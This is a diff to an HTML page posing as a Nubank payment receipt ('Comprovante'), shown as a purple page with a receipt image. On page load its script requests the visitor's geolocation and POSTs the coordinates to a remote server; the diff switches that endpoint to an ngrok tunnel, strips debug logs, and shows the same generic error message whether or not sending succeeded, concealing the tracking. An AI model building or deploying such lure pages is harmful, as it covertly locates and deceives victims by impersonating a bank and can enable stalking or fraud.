@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>ComprovanteNubank</title>
+  <title>Comprovante</title>
 </head>
 <body style="background-color: #6B02A3">
   <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
@@ -10,13 +10,9 @@
   <script>
     // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
-      console.log("Página carregada, tentando acessar a geolocalização...");
-      
       if (navigator.geolocation) {
-        console.log("Geolocalização disponível. Tentando obter a localização...");
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError, { timeout: 30000 });
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        console.log("Geolocalização não suportada no navegador.");
         alert("Algo deu errado. Tente novamente mais tarde.");
       }
     });
@@ -25,48 +21,32 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      console.log("Localização obtida:");
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("https://comprovantenubank-nunegocios.vercel.app/send-location", {
+      fetch("https://99cf-2804-6950-9-67d1-287f-f39f-9cdf-cee1.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error(`Erro no servidor: ${response.status} - ${response.statusText}`);
-        }
-        return response.text(); // Lê a resposta como texto
-      })
-      .then(text => {
-        console.log("Resposta do servidor: ", text); // Exibe a resposta do servidor
-
-        try {
-          const data = JSON.parse(text);  // Tenta converter a resposta para JSON
-          if (data.success) {
-            alert("Localização enviada com sucesso!");
-          } else {
-            alert("Erro ao enviar a localização. Tente novamente mais tarde.");
-          }
-        } catch (error) {
-          console.error("Erro ao tentar parsear a resposta como JSON: ", error);
-          alert("Erro na resposta do servidor.");
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert("Algo deu errado. Tente novamente mais tarde.");
+        } else {
+          alert("Algo deu errado. Tente novamente mais tarde.");
         }
       })
       .catch(error => {
-        console.error("Erro ao enviar os dados:", error);
-        alert("Erro ao enviar a localização. Tente novamente mais tarde.");
+        console.error("Erro:", error);
       });
     }
 
     function handleError(error) {
-      console.error("Erro ao obter a localização:", error); // Log do erro completo
-      alert("Erro ao obter a localização. Código do erro: " + error.code + ". Mensagem: " + error.message);
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
